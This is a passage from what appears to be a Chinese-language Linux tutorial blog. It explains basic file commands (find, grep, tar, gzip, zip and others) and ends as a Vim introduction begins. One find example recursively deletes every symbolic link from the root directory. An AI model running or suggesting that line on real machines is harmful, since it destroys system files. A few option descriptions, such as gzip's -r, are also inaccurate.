</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">head</span> /etc/man.config</span><br></pre></td></tr></table></figure>
<p>默认的情况中，显示前面 10 行！若要显示前 20 行，就得要这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">head</span> -n 20 /etc/man.config</span><br></pre></td></tr></table></figure>
<p>tail取出文件后面几行</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> [-n number] 文件 </span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-n ：后面接数字，代表显示几行的意思</p>
</li>
<li class="lvl-2">
<p>-f ：表示持续侦测后面所接的档名，要等到按下[ctrl]-c才会结束tail的侦测</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">tail</span> /etc/man.config</span><br><span class="line"><span class="comment"># 默认的情况中，显示最后的十行！若要显示最后的 20 行，就得要这样：</span></span><br><span class="line">[root@rocky8:~]# <span class="built_in">tail</span> -n 20 /etc/man.config</span><br></pre></td></tr></table></figure>
<h4 id="显示当前路径：pwd">显示当前路径：pwd</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">pwd</span></span><br><span class="line">/root</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>-P</strong> ：显示出确实的路径，而非使用连结 (link) 路径。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cd</span> /var/mail</span><br><span class="line">[root@rocky8:mail]# <span class="built_in">pwd</span></span><br><span class="line">/var/mail</span><br><span class="line">[root@rocky8:mail]# <span class="built_in">pwd</span> -P</span><br><span class="line">/var/spool/mail</span><br></pre></td></tr></table></figure>
<h2 id="文件操作">文件操作</h2>
<h4 id="创建目录：mkdir">创建目录：mkdir</h4>
<p>mkdir可以创建一个新的目录。</p>
<p>注意：新建目录的名称不能与当前目录中已有的目录或文件同名，并且目录创建者必须对当前目录具有写权限。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> [-mp] 目录名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-m ：指定被创建目录的权限，而不是根据默认权限 (umask) 设定</p>
</li>
<li class="lvl-2">
<p>-p ：递归创建所需要的目录</p>
</li>
</ul>
<p>实例：-p递归创建目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cd</span> /tmp</span><br><span class="line">[root@rocky8:tmp]# <span class="built_in">mkdir</span> <span class="built_in">test</span>	&lt;==创建一名为 <span class="built_in">test</span> 的新目录</span><br><span class="line">[root@rocky8:tmp]# <span class="built_in">mkdir</span> test1/test2/test3/test4</span><br><span class="line"><span class="built_in">mkdir</span>: cannot create directory ‘test1/test2/test3/test4’: No such file or directory		&lt;== 没办法直接创建此目录啊！</span><br><span class="line">[root@rocky8:tmp]# <span class="built_in">mkdir</span> -p test1/test2/test3/test4</span><br></pre></td></tr></table></figure>
<p>mkdir创建的目录权限默认根据umask得到，而-m参数可以指定被创建目录的权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">mkdir</span> t1</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x. 2 root root 6 Feb 20 15:06 t1</span><br><span class="line">[root@rocky8:~]# <span class="built_in">mkdir</span> t2 -m 711</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x. 2 root root 6 Feb 20 15:06 t1</span><br><span class="line">drwx--x--x. 2 root root 6 Feb 20 15:06 t2</span><br></pre></td></tr></table></figure>
<h4 id="删除文件：rm">删除文件：rm</h4>
<p>可通过rm删除文件或目录。使用rm命令要小心，因为文件删除后不能恢复。为了防止文件误删，可以在rm后使用-i参数以逐个确认要删除的文件。</p>
<p>常用参数及含义如下表所示：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-i</td>
<td>以进行交互式方式执行</td>
</tr>
<tr>
<td>-f</td>
<td>强制删除，忽略不存在的文件，无需提示</td>
</tr>
<tr>
<td>-r</td>
<td>递归地删除目录下的内容，删除文件夹时必须加此参数</td>
</tr>
</tbody>
</table>
<p>####ln： 建立链接文件</p>
<p>软链接：ln -s 源文件 链接文件</p>
<p>硬链接：ln 源文件 链接文件</p>
<p>软链接类似于Windows下的快捷方式，如果软链接文件和源文件不在同一个目录，源文件要使用绝对路径，不能使用相对路径。</p>
<p>硬链接只能链接普通文件不能链接目录。 两个文件占用相同大小的硬盘空间，即使删除了源文件，链接文件还是存在，所以-s选项是更常见的形式。</p>
<h4 id="rename：修改文件名">rename：修改文件名</h4>
<p>rename命令是在Linux和Unix系统中使用的一个命令，用于批量重命名文件或目录。支持正则表达式。基本语法:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rename [选项] 表达式 替换的字符 文件...</span><br></pre></td></tr></table></figure>
<p>命令选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#rename -h</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line"> rename [options] &lt;expression&gt; &lt;replacement&gt; &lt;file&gt;...</span><br><span class="line"></span><br><span class="line">Rename files.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"> -v, --verbose       explain what is being <span class="keyword">done</span></span><br><span class="line"> -s, --symlink       act on the target of symlinks</span><br><span class="line"> -n, --no-act        <span class="keyword">do</span> not make any changes</span><br><span class="line"> -o, --no-overwrite  don<span class="string">&#x27;t overwrite existing files</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> -h, --help          display this help</span></span><br><span class="line"><span class="string"> -V, --version       display version</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">For more details see rename(1).</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>下面是rename命令的常用选项</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-v, --verbose : 显示详细的操作信息 </span><br><span class="line">-s, --symlink : 对符号链接目标进行操作</span><br><span class="line">-h, --<span class="built_in">help</span> : 显示帮助信息并退出 </span><br><span class="line">-V, --version : 显示版本信息并退出</span><br></pre></td></tr></table></figure>
<p>实例1：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#rename -v file afile file0?</span><br><span class="line">`file01<span class="string">&#x27; -&gt; `afile01&#x27;</span></span><br><span class="line">`file02<span class="string">&#x27; -&gt; `afile02&#x27;</span></span><br><span class="line">`file03<span class="string">&#x27; -&gt; `afile03&#x27;</span></span><br><span class="line">`file04<span class="string">&#x27; -&gt; `afile04&#x27;</span></span><br><span class="line">`file05<span class="string">&#x27; -&gt; `afile05&#x27;</span></span><br><span class="line">`file06<span class="string">&#x27; -&gt; `afile06&#x27;</span></span><br><span class="line">`file07<span class="string">&#x27; -&gt; `afile07&#x27;</span></span><br><span class="line">`file08<span class="string">&#x27; -&gt; `afile08&#x27;</span></span><br><span class="line">`file09<span class="string">&#x27; -&gt; `afile09&#x27;</span></span><br></pre></td></tr></table></figure>
<p>实例2：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#rename file afile *</span><br><span class="line">[root@rocky8:~]#<span class="built_in">ls</span></span><br><span class="line">aafile01  aafile09  afile017  afile025  afile033  afile041  afile049  afile057  afile065  afile073  afile081  afile089  afile097......</span><br></pre></td></tr></table></figure>
<h4 id="grep：文本搜索">grep：文本搜索</h4>
<p>Linux系统中grep命令是一种强大的文本搜索工具，grep允许对文本文件进行模式查找。如果找到匹配模式， grep打印包含模式的所有行。</p>
<p>grep一般格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep [-选项] <span class="string">&#x27;搜索内容串&#x27;</span> 文件名</span><br></pre></td></tr></table></figure>
<p>在grep命令中输入字符串参数时，最好引号或双引号括起来。例如：<code>grep 'a' 1.txt</code>。</p>
<p>在当前目录中，查找前缀有test字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep <span class="built_in">test</span> <span class="built_in">test</span>* <span class="comment">#查找前缀有test的文件包含test字符串的文件  </span></span><br><span class="line">testfile1:This a Linux testfile! <span class="comment">#列出testfile1 文件中包含test字符的行  </span></span><br><span class="line">testfile_2:This is a linux testfile! <span class="comment">#列出testfile_2 文件中包含test字符的行  </span></span><br><span class="line">testfile_2:Linux <span class="built_in">test</span> <span class="comment">#列出testfile_2 文件中包含test字符的行 </span></span><br></pre></td></tr></table></figure>
<p>以递归的方式查找符合条件的文件。例如，查找指定目录/etc/acpi 及其子目录（如果存在子目录的话）下所有文件中包含字符串&quot;update&quot;的文件，并打印出该字符串所在行的内容，使用的命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep -r update /etc/acpi <span class="comment">#以递归的方式查找“etc/acpi”  </span></span><br><span class="line"><span class="comment">#下包含“update”的文件  </span></span><br><span class="line">/etc/acpi/ac.d/85-anacron.sh:# (Things like the slocate updatedb cause a lot of IO.)  </span><br><span class="line">Rather than  </span><br><span class="line">/etc/acpi/resume.d/85-anacron.sh:# (Things like the slocate updatedb cause a lot of  </span><br><span class="line">IO.) Rather than  </span><br><span class="line">/etc/acpi/events/thinkpad-cmos:action=/usr/sbin/thinkpad-keys--update </span><br></pre></td></tr></table></figure>
<p>反向查找。前面各个例子是查找并打印出符合条件的行，通过&quot;-v&quot;参数可以打印出不符合条件行的内容。</p>
<p>查找文件名中包含 test 的文件中不包含test 的行，此时，使用的命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep -v <span class="built_in">test</span>* <span class="comment">#查找文件名中包含test 的文件中不包含test 的行  </span></span><br><span class="line">testfile1:helLinux!  </span><br><span class="line">testfile1:Linis a free Unix-<span class="built_in">type</span> operating system.  </span><br><span class="line">testfile1:Lin  </span><br><span class="line">testfile_1:HELLO LINUX!  </span><br><span class="line">testfile_1:LINUX IS A FREE UNIX-TYPE OPTERATING SYSTEM.  </span><br><span class="line">testfile_1:THIS IS A LINUX TESTFILE!  </span><br><span class="line">testfile_2:HELLO LINUX!  </span><br><span class="line">testfile_2:Linux is a free unix-type opterating system.  </span><br></pre></td></tr></table></figure>
<h4 id="查找文件：find">查找文件：find</h4>
<p>常用用法：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>find ./ -name <a href="http://test.sh">test.sh</a></td>
<td>查找当前目录下所有名为test.sh的文件</td>
</tr>
<tr>
<td>find ./ -name ‘*.sh’</td>
<td>查找当前目录下所有后缀为.sh的文件</td>
</tr>
<tr>
<td>find ./ -name “[A-Z]*”</td>
<td>查找当前目录下所有以大写字母开头的文件</td>
</tr>
<tr>
<td>find /tmp -size 2M</td>
<td>查找在/tmp 目录下等于2M的文件</td>
</tr>
<tr>
<td>find /tmp -size +2M</td>
<td>查找在/tmp 目录下大于2M的文件</td>
</tr>
<tr>
<td>find /tmp -size -2M</td>
<td>查找在/tmp 目录下小于2M的文件</td>
</tr>
<tr>
<td>find ./ -size +4k -size -5M</td>
<td>查找当前目录下大于4k，小于5M的文件</td>
</tr>
<tr>
<td>find ./ -perm 0777</td>
<td>查找当前目录下权限为 777 的文件或目录</td>
</tr>
</tbody>
</table>
<p>Linux find命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find path -option [ -<span class="built_in">print</span> ] [ -<span class="built_in">exec</span> -ok <span class="built_in">command</span> ] &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p><strong>常用参数说明</strong> :</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-perm xxxx：权限为 xxxx的文件或目录</p>
</li>
<li class="lvl-2">
<p>-user： 按照文件属主来查找文件。</p>
</li>
<li class="lvl-2">
<p>-size n : n单位,b:512位元组的区块,c:字元数,k:kilo bytes,w:二个位元组</p>
</li>
<li class="lvl-2">
<p>-mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件</p>
</li>
<li class="lvl-2">
<p>-amin n : 在过去 n 分钟内被读取过</p>
</li>
<li class="lvl-2">
<p>-anewer file : 比文件 file 更晚被读取过的文件</p>
</li>
<li class="lvl-2">
<p>-atime n : 在过去n天内被读取过的文件</p>
</li>
<li class="lvl-2">
<p>-cmin n : 在过去 n 分钟内被修改过</p>
</li>
<li class="lvl-2">
<p>-cnewer file :比文件 file 更新的文件</p>
</li>
<li class="lvl-2">
<p>-ctime n : 在过去n天内被修改过的文件</p>
</li>
<li class="lvl-2">
<p>-empty : 空的文件</p>
</li>
<li class="lvl-2">
<p>-gid n or -group name : gid 是 n 或是 group 名称是 name</p>
</li>
<li class="lvl-2">
<p>-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写</p>
</li>
<li class="lvl-2">
<p>-name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写</p>
</li>
<li class="lvl-2">
<p>-type 查找某一类型的文件：</p>
<ul class="lvl-2">
<li class="lvl-4">b - 块设备文件</li>
<li class="lvl-4">d - 目录</li>
<li class="lvl-4">c - 字符设备文件</li>
<li class="lvl-4">p - 管道文件</li>
<li class="lvl-4">l - 符号链接文件</li>
<li class="lvl-4">f - 普通文件</li>
</ul>
</li>
<li class="lvl-2">
<p>-exec 命令名{} \ (注意：“}”和“\”之间有空格)</p>
</li>
</ul>
<p>find实例：</p>
<p>显示当前目录中大于20字节并以.c结尾的文件名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -name <span class="string">&quot;*.c&quot;</span> -size +20c </span><br></pre></td></tr></table></figure>
<p>将目前目录其其下子目录中所有一般文件列出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure>
<p>将目前目录及其子目录下所有最近 20 天内更新过的文件列出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -ctime -20</span><br></pre></td></tr></table></figure>
<p>查找/var/log目录中更改时间在7日以前的普通文件，并在删除之前询问它们：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /var/log -<span class="built_in">type</span> f -mtime +7 -ok <span class="built_in">rm</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>查找前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -perm 644 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>查找系统中所有文件长度为0的普通文件，并列出它们的完整路径：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size 0 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>从根目录查找类型为符号链接的文件，并将其删除：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> l -<span class="built_in">exec</span> <span class="built_in">rm</span> -rf &#123;&#125; \</span><br></pre></td></tr></table></figure>
<p>从当前目录查找用户tom的所有文件并显示在屏幕上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -user tom</span><br></pre></td></tr></table></figure>
<p>在当前目录中查找所有文件以.doc结尾，且更改时间在3天以上的文件，找到后删除，并且给出删除提示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -name *.doc  -mtime +3 -ok <span class="built_in">rm</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>在当前目录下查找所有链接文件，并且以长格式显示文件的基本信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> l -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>在当前目录下查找文件名有一个小写字母、一个大写字母、两个数字组成，且扩展名为.doc的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -name <span class="string">&#x27;[a-z][A-Z][0-9][0-9].doc&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="拷贝文件：cp">拷贝文件：cp</h4>
<p>cp命令的功能是将给出的文件或目录复制到另一个文件或目录中，相当于DOS下的copy命令。</p>
<p>常用选项说明：</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-a</td>
<td>该选项通常在复制目录时使用，它保留链接、文件属性，并递归地复制目录，简单而言，保持文件原有属性。</td>
</tr>
<tr>
<td>-f</td>
<td>已经存在的目标文件而不提示</td>
</tr>
<tr>
<td>-i</td>
<td>交互式复制，在覆盖目标文件之前将给出提示要求用户确认</td>
</tr>
<tr>
<td>-r</td>
<td>若给出的源文件是目录文件，则cp将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名。</td>
</tr>
<tr>
<td>-v</td>
<td>显示拷贝进度</td>
</tr>
<tr>
<td>-l</td>
<td>创建硬链接(hard link)，而非复制文件本身</td>
</tr>
<tr>
<td>-s</td>
<td>复制成为符号链接 (symbolic link)，相当于批量创建快捷方式</td>
</tr>
<tr>
<td>-u</td>
<td>若 destination 比 source 旧才升级 destination ！</td>
</tr>
</tbody>
</table>
<p>cp vim_configure/ code/ -ivr 把文件夹 vim_configure 拷贝到 code 目录里。</p>
<h4 id="移动文件：mv">移动文件：mv</h4>
<p>mv命令用来移动文件或目录，也可以给文件或目录重命名。</p>
<p>常用选项说明：</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-f</td>
<td>禁止交互式操作，如有覆盖也不会给出提示</td>
</tr>
<tr>
<td>-i</td>
<td>确认交互方式操作，如果mv操作将导致对已存在的目标文件的覆盖，系统会询问是否重写，要求用户回答以避免误覆盖文件</td>
</tr>
<tr>
<td>-v</td>
<td>显示移动进度</td>
</tr>
</tbody>
</table>
<p>mv可以修改文件名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#ll</span><br><span class="line">total 4</span><br><span class="line">-rw-------. 1 root root 1256 Feb 18 21:18 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 root root    0 Feb 19 11:43 test.txt</span><br><span class="line">[root@rocky8:~]#<span class="built_in">mv</span> test.txt <span class="built_in">test</span></span><br><span class="line">[root@rocky8:~]#ll</span><br><span class="line">total 4</span><br><span class="line">-rw-------. 1 root root 1256 Feb 18 21:18 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 root root    0 Feb 19 11:43 <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<h4 id="归档管理：tar">归档管理：tar</h4>
<p>此命令可以把一系列文件归档到一个大文件中，也可以把档案文件解开以恢复数据。</p>
<p>tar使用格式 tar [参数] 打包文件名 文件</p>
<p>tar命令参数很特殊，其参数前面可以使用“-”，也可以不使用。</p>
<p>常用参数：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-c</td>
<td>生成档案文件，创建打包文件</td>
</tr>
<tr>
<td>-v</td>
<td>列出归档解档的详细过程，显示进度</td>
</tr>
<tr>
<td>-f</td>
<td>指定档案文件名称，f后面一定是.tar文件，所以必须放选项最后</td>
</tr>
<tr>
<td>-t</td>
<td>列出档案中包含的文件</td>
</tr>
<tr>
<td>-x</td>
<td>解开档案文件</td>
</tr>
</tbody>
</table>
<p>注意：除了f需要放在参数的最后，其它参数的顺序任意。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# tar -cvf test.tar &#123;1..3&#125;.txt</span><br><span class="line">1.txt</span><br><span class="line">2.txt</span><br><span class="line">3.txt</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 1.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 2.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 3.txt</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br><span class="line">[root@rocky8:~]# <span class="built_in">rm</span> -rf *.txt</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br><span class="line">[root@rocky8:~]# tar -xvf test.tar </span><br><span class="line">1.txt</span><br><span class="line">2.txt</span><br><span class="line">3.txt</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 1.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 2.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 3.txt</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br></pre></td></tr></table></figure>
<h4 id="文件压缩解压：gzip、bzip2">文件压缩解压：gzip、bzip2</h4>
<p>tar与gzip命令结合使用实现文件打包、压缩。 tar只负责打包文件，但不压缩，用gzip压缩tar打包后的文件，其扩展名一般用xxxx.tar.gz。</p>
<p>gzip使用格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gzip  [选项]  被压缩文件</span><br></pre></td></tr></table></figure>
<p>常用选项：</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td>解压文件</td>
</tr>
<tr>
<td>-r</td>
<td>压缩文件</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ll *.tar*</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br><span class="line">[root@rocky8:~]# gzip -r test.tar test.tar.gz  ==&gt;或者:gzip test.tar</span><br><span class="line">[root@rocky8:~]# ll *.tar*</span><br><span class="line">-rw-r--r--. 1 root root 131 Feb 20 15:14 test.tar.gz</span><br><span class="line">[root@rocky8:~]# gzip -d test.tar.gz </span><br><span class="line">[root@rocky8:~]# ll *.tar*</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br></pre></td></tr></table></figure>
<p>tar命令中-z选项可以调用gzip实现了一个压缩的功能，实行一个先打包后压缩的过程。</p>
<p>压缩用法：tar zcvf 压缩包包名 文件1 文件2 …</p>
<p>例如： tar zcvf test.tar.gz 1.c 2.c 3.c 4.c把 1.c 2.c 3.c 4.c 压缩成 test.tar.gz</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c</span><br><span class="line">[root@rocky8:~]# tar -zcvf test.tar.gz &#123;1..4&#125;.c</span><br><span class="line">1.c</span><br><span class="line">2.c</span><br><span class="line">3.c</span><br><span class="line">4.c</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  test.tar.gz</span><br><span class="line">[root@rocky8:~]# gzip -d test.tar.gz </span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  test.tar</span><br></pre></td></tr></table></figure>
<p>解压用法： tar zxvf 压缩包包名</p>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">new.tar.gz  test.tar  test.tar.gz</span><br><span class="line">[root@rocky8:~]# tar -zxvf new.tar.gz</span><br><span class="line">1.c</span><br><span class="line">2.c</span><br><span class="line">3.c</span><br><span class="line">4.c</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  new.tar.gz  test.tar  test.tar.gz</span><br></pre></td></tr></table></figure>
<p>解压到指定目录：-C （解压时可以不指定-z选项）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  new.tar.gz  test.tar  test.tar.gz</span><br><span class="line">[root@rocky8:~]# tar -zxvf new.tar.gz -C number/</span><br><span class="line">1.c</span><br><span class="line">2.c</span><br><span class="line">3.c</span><br><span class="line">4.c</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span> number/</span><br><span class="line">1.c  2.c  3.c  4.c</span><br></pre></td></tr></table></figure>
<p>bzip2命令跟gzip用法类似</p>
<p>压缩用法：tar jcvf 压缩包包名 文件…(tar jcvf bk.tar.bz2 *.c)</p>
<p>解压用法：tar jxvf 压缩包包名 (tar jxvf bk.tar.bz2)</p>
<h4 id="文件压缩解压：zip、unzip">文件压缩解压：zip、unzip</h4>
<p>通过zip压缩文件的目标文件不需要指定扩展名，默认扩展名为zip。</p>
<p>压缩文件：zip [-r] 目标文件(没有扩展名) 源文件</p>
<p>解压文件：unzip -d 解压后目录文件 压缩文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.txt  2.txt  3.txt  4.txt  test.tar</span><br><span class="line">[root@rocky8:~]# zip myzip *.txt</span><br><span class="line">  adding: 1.txt (stored 0%)</span><br><span class="line">  adding: 2.txt (stored 0%)</span><br><span class="line">  adding: 3.txt (stored 0%)</span><br><span class="line">  adding: 4.txt (stored 0%)</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.txt  2.txt  3.txt  4.txt  myzip.zip  test.tar</span><br><span class="line">[root@rocky8:~]# <span class="built_in">rm</span> -f *.txt *.tar</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">myzip.zip</span><br><span class="line">[root@rocky8:~]# unzip myzip</span><br><span class="line">Archive:  myzip.zip</span><br><span class="line"> extracting: 1.txt                   </span><br><span class="line"> extracting: 2.txt                   </span><br><span class="line"> extracting: 3.txt                   </span><br><span class="line"> extracting: 4.txt                   </span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.txt  2.txt  3.txt  4.txt  myzip.zip</span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】Vim使用及文本处理</title>
    <url>/posts/247a4e5f/</url>
    <content><![CDATA[<h2 id="vim的使用">vim的使用</h2>
<h3 id="什么是-vim？">什么是 vim？</h3>
<p>Vim是从 vi 发展出来的一个文本编辑器。代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。vim 的官方网站 (<a href="http://www.vim.org/">http://www.vim.org</a>)</p>
<p>vim 键盘图：</p>
<p><img src="/posts/247a4e5f//11de8c1d4c8385c025ede918e03b6a86.gif" alt="img"></p>
<p>基本上vi可以分为三种状态：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>命令模式（command mode)</p>
</li>
<li class="lvl-2">
<p>插入模式（Insert mode)</p>
</li>
<li class="lvl-2">
<p>底行模式（last line mode)</p>
</li>
</ul>
<h3 id="vi-vim的三种模式">vi/vim的三种模式</h3>
<p>vi/vim主要分为三种模式，分别是<strong>命令模式（Command mode）</strong>，<strong>输入模式（Insert mode）**和**底线命令模式（Last line mode）</strong>。</p>
<p><img src="/posts/247a4e5f//1cee092565d316d1462ddbf987fbc6e1.png" alt="img"></p>
<p>这三种模式的作用分别是：</p>
<h4 id="输入模式">输入模式</h4>
<p>在命令模式下输入插入命令i、附加命令a 、打开命令o、修改命令c、取代命令r或替换命令s都可以进入文本输入模式。在该模式下，用户输入的任何字符都被Vi当做文件内容保存起来，并将其显示在屏幕上。在文本输入过程中，若想回到命令模式下，按键ESC即可。</p>
<h4 id="命令模式">命令模式</h4>
<p>用户刚刚启动 vi/vim，便进入了命令模式。 任何时候，不管用户处于何种模式，只要按一下ESC键，即可使Vi进入命令模式；</p>
<p>此状态下敲击键盘动作会被Vim识别为命令，输入<code>:</code> 可切换到<strong>底线命令模式</strong>，以在最底一行输入命令。</p>
<p>若想要编辑文本：启动Vim，进入了命令模式，按下i，切换到输入模式。</p>
<h4 id="底行模式">底行模式</h4>
<p>在命令模式下按下:（英文冒号）就进入了底行命令模式。</p>
<p>底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</p>
<p>在底线命令模式中，基本的命令有（已经省略了冒号）：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>q 退出程序</p>
</li>
<li class="lvl-2">
<p>w 保存文件</p>
</li>
</ul>
<p>按ESC键可随时退出底线命令模式。</p>
<h3 id="vim基础操作">vim基础操作</h3>
<h4 id="进入输入模式-Insert-mode">进入输入模式(Insert mode)</h4>
